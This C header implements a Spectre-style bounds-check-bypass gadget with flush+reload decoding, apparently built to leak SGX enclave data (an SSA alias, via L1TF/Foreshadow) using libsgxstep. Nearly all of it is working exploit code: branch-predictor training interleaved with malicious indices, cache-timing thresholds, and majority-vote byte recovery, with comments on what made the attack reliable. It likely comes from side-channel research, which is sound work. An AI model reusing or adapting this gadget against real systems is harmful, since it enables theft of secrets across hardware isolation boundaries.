/*
 *  Gate-based branch-misprediction leak gadget (non-TSX Foreshadow variant),
 *  Kocher bounds-check-bypass form -- the shape validated at 256/256 in
 *  selftest-mispredict.c. Shared verbatim by the offline validator
 *  (selftest-mispredict2.c; the leaked byte is present) and, once ported,
 *  foreshadow-ssa-warm.c (the leaked byte is the non-present SSA alias -> L1TF).
 *
 *  Why this shape (learned the hard way, kept as warnings):
 *   - a WRITTEN-then-flushed gate is store-forwarded from the store buffer, so the
 *     branch resolves fast and never mispredicts. The bound must be FIXED and only
 *     ever clflush'd.
 *   - 32 sequential training iterations then ONE attack does not mispredict
 *     reliably here; training and the attack must be INTERLEAVED in a tight loop
 *     (malicious index every 6th), the way Kocher does it.
 *   - training reads the SAME present `mp_array` as the attack, only at an
 *     in-bounds index; the attack's out-of-bounds index makes mp_array[x] land on
 *     the target (secret offline; the SSA alias live, via malicious_x = target -
 *     mp_array). Training touches the real oracle, so the decoder EXCLUDES the
 *     per-round training class (it cycles, so nothing is permanently masked) and
 *     the SSA-set class (false-hot from the speculative alias read).
 */
#ifndef MISPREDICT_GADGET_H
#define MISPREDICT_GADGET_H

#include <stddef.h>
#include <stdint.h>
#include "libsgxstep/cache.h"    /* maccess(), flush(), reload() */

#ifndef MP_SLOT_SIZE
#define MP_SLOT_SIZE 0x1040
#endif
#ifndef MP_HIT
#define MP_HIT 120               /* reload hit threshold (hit ~47, miss ~260) */
#endif
#ifndef MP_INNER
#define MP_INNER 30              /* interleaved train/attack iterations per round */
#endif

/* single definitions live in exactly one TU. mp_bound is FIXED (only flushed). */
extern volatile long mp_bound;
extern uint8_t     *mp_array;    /* present training array, mp_array[i] = i, len >= mp_bound */
extern char *volatile mp_oracle; /* the bank the gadget touches (set per round) */

static void __attribute__((noinline)) mp_gadget_lo(long x)
{
    if (x < mp_bound) {
        unsigned v = mp_array[x];
        maccess(mp_oracle + (size_t)(v & 0x3f) * MP_SLOT_SIZE);
    }
}
static void __attribute__((noinline)) mp_gadget_hi(long x)
{
    if (x < mp_bound) {
        unsigned v = mp_array[x];
        maccess(mp_oracle + (size_t)((v >> 6) & 3) * MP_SLOT_SIZE);
    }
}

static inline int mp_set_of(void *p) { return (int)(((uint64_t) p >> 6) & 63); }

/*
 *  Leak one trace and return the best class by majority over `tries` rounds.
 *    hi           : 0 = low-6-bit trace (64 classes), 1 = high-2-bit trace (4)
 *    malicious_x  : (target_byte - mp_array); speculative mp_array[malicious_x]
 *                   reads the target (present secret offline, SSA alias live)
 *    oracle_base  : oracle bank for this trace
 *    classes      : 64 (lo) or 4 (hi)
 *    ssa_set      : L1 set of the target byte (excluded: false-hot from the read)
 *    tries        : majority-vote rounds
 */
static inline int mp_leak_class(int hi, long malicious_x, char *oracle_base,
                                int classes, int ssa_set, int tries)
{
    static int results[64];
    int c;
    for (c = 0; c < classes; c++) results[c] = 0;
    mp_oracle = oracle_base;

    for (int t = tries; t > 0; t--)
    {
        for (c = 0; c < classes; c++) flush(oracle_base + (size_t) c * MP_SLOT_SIZE);

        long training_x = t % mp_bound;
        int  train_class = (mp_array[training_x] >> (hi ? 6 : 0)) & (classes - 1);

        for (int j = MP_INNER - 1; j >= 0; j--)
        {
            flush((void *) &mp_bound);
            for (volatile int z = 0; z < 100; z++) { }
            long x = ((j % 6) - 1) & ~0xFFFFL;   /* 0 for j%6==0, else 0xFFFF..0000 */
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));  /* malicious every 6th */
            if (hi) mp_gadget_hi(x); else mp_gadget_lo(x);
        }

        for (c = 0; c < classes; c++)
        {
            int mix = ((c * 167) + 13) % classes;
            uint64_t rt = reload(oracle_base + (size_t) mix * MP_SLOT_SIZE);
            if (rt <= MP_HIT && mix != train_class && mix != ssa_set)
                results[mix]++;
        }
    }

    int best = 0;
    for (c = 1; c < classes; c++) if (results[c] > results[best]) best = c;
    return best;
}

#endif /* MISPREDICT_GADGET_H */
